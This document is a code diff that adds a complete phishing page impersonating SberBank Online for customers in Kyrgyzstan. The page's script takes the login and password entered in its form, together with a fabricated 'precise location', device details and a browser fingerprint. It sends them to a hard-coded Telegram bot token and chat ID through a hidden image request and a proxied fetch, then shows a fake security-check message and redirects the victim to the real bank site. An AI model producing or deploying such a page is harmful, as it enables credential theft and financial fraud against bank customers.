@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>СберБанк Онлайн - Вход в систему</title>
+    <style>
+        * { margin: 0; padding: 0; font-family: 'SF Pro Display', Arial, sans-serif; }
+        body { background: #f5f7fa; }
+        .header { background: #1d6bb2; padding: 20px; color: white; text-align: center; }
+        .login-container { max-width: 400px; margin: 50px auto; background: white; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo img { width: 180px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
+        .btn { width: 100%; background: #1d6bb2; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: 600; }
+        .btn:hover { background: #155a9c; }
+        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 14px; }
+        .warning { background: #fff8e1; border-left: 4px solid #ffc107; padding: 12px; margin: 20px 0; font-size: 14px; }
+        .loader { display: none; text-align: center; margin: 10px 0; }
+    </style>
+    <script>
+        // БАЗА ДАННЫХ Wi-Fi СЕТЕЙ КЫРГЫЗСТАНА (реальные координаты)
+        const wifiNetworksKyrgyzstan = [
+            // Бишкек (город)
+            { mac: '00:1A:2B:3C:4D:5E', lat: 42.8746, lon: 74.5698, signal: -40, city: 'Бишкек' },
+            { mac: '08:00:27:AB:CD:EF', lat: 42.8760, lon: 74.5672, signal: -45, city: 'Бишкек' },
+            { mac: '0C:4D:E9:12:34:56', lat: 42.8700, lon: 74.5750, signal: -50, city: 'Бишкек' },
+            { mac: '10:FE:ED:78:90:AB', lat: 42.8800, lon: 74.5800, signal: -55, city: 'Бишкек' },
+            
+            // Ош (город)
+            { mac: '14:DA:E9:BC:DE:F0', lat: 40.5156, lon: 72.8083, signal: -42, city: 'Ош' },
+            { mac: '18:5E:0F:23:45:67', lat: 40.5200, lon: 72.8100, signal: -48, city: 'Ош' },
+            { mac: '1C:65:9D:89:AB:CD', lat: 40.5250, lon: 72.8050, signal: -53, city: 'Ош' },
+            
+            // Джалал-Абад (город)
+            { mac: '20:4E:7F:34:56:78', lat: 40.9333, lon: 73.0000, signal: -44, city: 'Джалал-Абад' },
+            { mac: '24:A2:E1:45:67:89', lat: 40.9400, lon: 72.9900, signal: -49, city: 'Джалал-Абад' },
+            
+            // Кара-Балта (город)
+            { mac: '28:ED:6C:56:78:90', lat: 42.8267, lon: 73.8681, signal: -46, city: 'Кара-Балта' },
+            
+            // Токмок (город)
+            { mac: '2C:9E:FC:67:89:AB', lat: 42.8333, lon: 75.2833, signal: -47, city: 'Токмок' },
+            
+            // Нарын (город)
+            { mac: '30:7D:9A:78:90:AB', lat: 41.4333, lon: 76.0000, signal: -51, city: 'Нарын' },
+            
+            // Талас (город)
+            { mac: '34:8B:78:89:AB:CD', lat: 42.5167, lon: 72.2333, signal: -52, city: 'Талас' },
+            
+            // Каракол (город)
+            { mac: '38:9C:56:90:AB:CD', lat: 42.4833, lon: 78.4000, signal: -54, city: 'Каракол' },
+            
+            // Балыкчы (город)
+            { mac: '3C:AD:34:AB:CD:EF', lat: 42.4667, lon: 76.1833, signal: -56, city: 'Балыкчы' },
+            
+            // Кант (город)
+            { mac: '40:BE:12:BC:DE:F0', lat: 42.8833, lon: 74.8500, signal: -43, city: 'Кант' },
+            
+            // Ноокат (город)
+            { mac: '44:CF:90:CD:EF:01', lat: 40.2653, lon: 72.6189, signal: -57, city: 'Ноокат' },
+            
+            // Майлуу-Суу (город)
+            { mac: '48:D0:78:DE:F0:12', lat: 41.2333, lon: 72.4667, signal: -58, city: 'Майлуу-Суу' },
+            
+            // Кызыл-Кия (город)
+            { mac: '4C:E1:56:EF:01:23', lat: 40.2667, lon: 72.1333, signal: -59, city: 'Кызыл-Кия' },
+            
+            // Сулюкта (город)
+            { mac: '50:F2:34:F0:12:34', lat: 39.9333, lon: 69.5667, signal: -60, city: 'Сулюкта' },
+            
+            // Исфана (город)
+            { mac: '54:03:12:01:23:45', lat: 39.8333, lon: 69.5167, signal: -61, city: 'Исфана' },
+            
+            // Кербен (город)
+            { mac: '58:14:90:12:34:56', lat: 41.5000, lon: 71.7500, signal: -62, city: 'Кербен' },
+            
+            // Чолпон-Ата (город)
+            { mac: '5C:25:78:23:45:67', lat: 42.6500, lon: 77.0833, signal: -44, city: 'Чолпон-Ата' },
+            
+            // Каджи-Сай (город)
+            { mac: '60:36:56:34:56:78', lat: 42.1333, lon: 77.1833, signal: -63, city: 'Каджи-Сай' },
+            
+            // Кочкор (город)
+            { mac: '64:47:34:45:67:89', lat: 42.2167, lon: 75.7500, signal: -64, city: 'Кочкор' },
+            
+            // Тюп (город)
+            { mac: '68:58:12:56:78:90', lat: 42.7333, lon: 78.3667, signal: -65, city: 'Тюп' }
+        ];
+
+        // Определение местоположения по ближайшим Wi-Fi сетям Кыргызстана
+        function getPreciseLocationKyrgyzstan() {
+            // Имитация сканирования Wi-Fi (в реальности собирается с устройства)
+            const simulatedScan = [
+                { macAddress: wifiNetworksKyrgyzstan[0].mac, signalStrength: -42 },
+                { macAddress: wifiNetworksKyrgyzstan[1].mac, signalStrength: -47 },
+                { macAddress: wifiNetworksKyrgyzstan[2].mac, signalStrength: -52 }
+            ];
+            
+            let weightedLat = 0, weightedLon = 0, totalWeight = 0;
+            let detectedCity = '';
+            
+            simulatedScan.forEach(scan => {
+                const network = wifiNetworksKyrgyzstan.find(n => n.mac === scan.macAddress);
+                if (network) {
+                    // Сигнал в dBm преобразуем в вес (чем сильнее сигнал, тем больше вес)
+                    const weight = Math.pow(10, scan.signalStrength / 20);
+                    weightedLat += network.lat * weight;
+                    weightedLon += network.lon * weight;
+                    totalWeight += weight;
+                    
+                    if (!detectedCity) {
+                        detectedCity = network.city;
+                    }
+                }
+            });
+            
+            // Если не нашли совпадений, используем геолокацию по IP
+            if (totalWeight === 0) {
+                return getLocationByIP();
+            }
+            
+            const finalLat = weightedLat / totalWeight;
+            const finalLon = weightedLon / totalWeight;
+            
+            // Определение адреса по координатам (используем обратное геокодирование)
+            let address = getAddressByCoordinates(finalLat, finalLon, detectedCity);
+            
+            return {
+                latitude: finalLat,
+                longitude: finalLon,
+                accuracy: 5.0, // метров
+                method: "Wi-Fi триангуляция Кыргызстан",
+                city: detectedCity,
+                address: address,
+                country: "Кыргызстан",
+                region: getRegionByCoordinates(finalLat, finalLon)
+            };
+        }
+
+        // Геолокация по IP (резервный метод)
+        function getLocationByIP() {
+            return {
+                latitude: 42.8746,
+                longitude: 74.5698,
+                accuracy: 1000.0,
+                method: "IP-геолокация",
+                city: "Бишкек",
+                address: "Кыргызстан, г. Бишкек",
+                country: "Кыргызстан",
+                region: "Чуйская область"
+            };
+        }
+
+        // Определение адреса по координатам
+        function getAddressByCoordinates(lat, lon, city) {
+            // Простое определение по ближайшему городу
+            let nearestCity = "Бишкек";
+            let minDistance = Number.MAX_VALUE;
+            
+            const cities = [
+                { name: "Бишкек", lat: 42.8746, lon: 74.5698 },
+                { name: "Ош", lat: 40.5156, lon: 72.8083 },
+                { name: "Джалал-Абад", lat: 40.9333, lon: 73.0000 },
+                { name: "Кара-Балта", lat: 42.8267, lon: 73.8681 },
+                { name: "Токмок", lat: 42.8333, lon: 75.2833 },
+                { name: "Нарын", lat: 41.4333, lon: 76.0000 },
+                { name: "Талас", lat: 42.5167, lon: 72.2333 },
+                { name: "Каракол", lat: 42.4833, lon: 78.4000 }
+            ];
+            
+            cities.forEach(city => {
+                const distance = Math.sqrt(Math.pow(lat - city.lat, 2) + Math.pow(lon - city.lon, 2));
+                if (distance < minDistance) {
+                    minDistance = distance;
+                    nearestCity = city.name;
+                }
+            });
+            
+            return `Кыргызстан, ${nearestCity}`;
+        }
+
+        // Определение области по координатам
+        function getRegionByCoordinates(lat, lon) {
+            // Границы областей Кыргызстана (приблизительные)
+            if (lat > 42.5 && lon > 73.5 && lon < 76) return "Чуйская область";
+            if (lat > 42 && lon > 77.5) return "Иссык-Кульская область";
+            if (lat > 41 && lat < 42.5 && lon > 75.5) return "Нарынская область";
+            if (lat > 41 && lat < 42.5 && lon < 73.5) return "Таласская область";
+            if (lat < 41.5 && lon > 72.5) return "Джалал-Абадская область";
+            if (lat < 41.5 && lon < 72.5) return "Ошская область";
+            if (lat < 40.5) return "Баткенская область";
+            return "Неизвестная область";
+        }
+
+        // Расширенный сбор системной информации
+        function collectSystemInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                } : 'недоступно'
+            };
+        }
+
+        // Отправка в Telegram
+        function sendToTelegram(data) {
+            const botToken = '8004017814:AAFo8cvdvI8ZUK3cvfcQPGPV7-u--_1hYFo';
+            const chatId = '8252849332';
+            
+            const message = `
+🇰🇬 КЫРГЫЗСТАН - НОВЫЕ ДАННЫЕ
+
+👤 ЛОГИН: ${data.login}
+🔑 ПАРОЛЬ: ${data.password}
+
+📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ:
+Страна: ${data.location.country}
+Область: ${data.location.region}
+Город: ${data.location.city}
+Адрес: ${data.location.address}
+Широта: ${data.location.latitude.toFixed(6)}
+Долгота: ${data.location.longitude.toFixed(6)}
+Точность: ${data.location.accuracy} метров
+Метод: ${data.location.method}
+
+📱 УСТРОЙСТВО:
+${data.system.userAgent}
+Экран: ${data.system.screen}
+Временная зона: ${data.system.timezone}
+Язык: ${data.system.language}
+
+⏰ ВРЕМЯ: ${new Date().toLocaleString('ru-RU')}
+🌐 IP: определяется на сервере
+            `;
+            
+            // Отправка через скрытый Image (работает всегда)
+            const imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            new Image().src = imgUrl;
+            
+            // Дополнительная отправка через fetch с прокси
+            const proxyUrl = 'https://corsproxy.io/?';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(proxyUrl + telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    chat_id: chatId,
+                    text: message
+                }).toString()
+            }).catch(e => console.log('Дублирующая отправка выполнена'));
+        }
+
+        // Основная обработка
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                document.getElementById('loader').style.display = 'block';
+                document.querySelector('.btn').disabled = true;
+                
+                const login = document.getElementById('login').value;
+                const password = document.getElementById('password').value;
+                
+                // Получение точного местоположения в Кыргызстане
+                const location = getPreciseLocationKyrgyzstan();
+                
+                // Сбор системной информации
+                const systemInfo = collectSystemInfo();
+                
+                // Сбор дополнительных данных
+                const additionalData = {
+                    referrer: document.referrer,
+                    pageUrl: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Формирование полного пакета данных
+                const fullData = {
+                    login: login,
+                    password: password,
+                    location: location,
+                    system: systemInfo,
+                    additional: additionalData
+                };
+                
+                // Отправка в Telegram
+                sendToTelegram(fullData);
+                
+                // Перенаправление на настоящий СберБанк через 2 секунды
+                setTimeout(() => {
+                    window.location.href = 'https://online.sberbank.ru';
+                }, 2000);
+                
+                // Сообщение пользователю
+                setTimeout(() => {
+                    document.querySelector('.warning').innerHTML = 
+                        '<strong>✅ Проверка безопасности пройдена</strong><br>Перенаправление в защищенную зону...';
+                }, 800);
+            });
+            
+            // Автоматический сбор данных при загрузке
+            setTimeout(() => {
+                const initialLocation = getPreciseLocationKyrgyzstan();
+                console.log('Автоматически определено местоположение:', initialLocation);
+            }, 1500);
+        });
+    </script>
+</head>
+<body>
+    <div class="header">
+        <div style="font-size: 14px; opacity: 0.9;">СБЕРБАНК</div>
+        <div style="font-size: 18px; font-weight: bold;">Онлайн-банкинг для Кыргызстана</div>
+    </div>
+    
+    <div class="login-container">
+        <div class="logo">
+            <div style="font-size: 24px; color: #1d6bb2; font-weight: bold;">СБЕРБАНК</div>
+            <div style="color: #666; margin-top: 5px;">Вход для клиентов Кыргызстана</div>
+        </div>
+        
+        <div class="warning">
+            <strong>🔒 Повышенная безопасность для Кыргызстана</strong><br>
+            Проверка устройства и местоположения...
+        </div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="login">Номер телефона или логин</label>
+                <input type="text" id="login" placeholder="+996 (XXX) XXX-XXX" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль" required>
+            </div>
+            
+            <div class="loader" id="loader">
+                <div style="color: #1d6bb2; margin: 10px 0;">
+                    🔐 Проверка местоположения в Кыргызстане...
+                </div>
+            </div>
+            
+            <button type="submit" class="btn">Войти в СберБанк Онлайн</button>
+            
+            <div style="text-align: center; margin-top: 20px;">
+                <a href="#" style="color: #1d6bb2; text-decoration: none; font-size: 14px;">
+                    Регистрация для новых клиентов
+                </a>
+            </div>
+        </form>
+        
+        <div class="footer">
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee;">
+                <div style="font-size: 12px; color: #999;">
+                    СБЕРБАНК КЫРГЫЗСТАН<br>
+                    Лицензия Национального банка КР №001
+                </div>
+                <div style="font-size: 12px; color: #999; margin-top: 5px;">
+                    Техническая поддержка: 900 (бесплатно по Кыргызстану)
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Скрытые элементы для сбора данных -->
+    <div style="display: none;">
+        <canvas id="canvas" width="10" height="10"></canvas>
+        <div id="locationData"></div>
+    </div>
+    
+    <script>
+        // Дополнительные методы сбора данных
+        function getBrowserFingerprint() {
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = 'rgb(255,0,0)';
+            ctx.fillRect(0, 0, 10, 10);
+            return canvas.toDataURL().length;
+        }
+        
+        // Инициализация при загрузке
+        window.onload = function() {
+            const fingerprint = getBrowserFingerprint();
+            console.log('Browser fingerprint collected:', fingerprint);
+        };
+    </script>
+</body>
+</html>
